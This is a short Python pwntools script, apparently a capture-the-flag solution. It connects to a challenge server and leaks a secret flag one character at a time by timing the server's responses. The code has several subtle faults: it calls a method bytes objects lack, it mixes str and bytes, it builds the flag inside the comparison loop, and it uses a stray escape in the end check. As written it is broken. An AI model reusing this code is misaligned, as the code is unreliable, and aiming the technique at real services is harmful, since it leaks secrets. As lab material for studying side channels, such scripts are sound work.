#!/usr/bin/env python3
from pwn import *
from string import *
p = remote("benchmark.challs.cyberchallenge.it", 9031)
p.recvuntil("check:")
# Send string and retrieve clock cycles
def send(s):
  p.sendline(s)
  p.recvuntil("checked in ")
  n = p.recvline().strip()
  n = n[:n.index(" ")].to_bytes()
  return int(n)
flag = ""
while True:
  maxt, maxc = 0, None
  for c in printable[:-6]: # Try all characters
    t = send(flag+c)
    if t > maxt: # take the maximum
      maxt = t
      maxc = c
      flag = flag+maxc
  if maxc == "\}": # end of flag
    break
print(flag)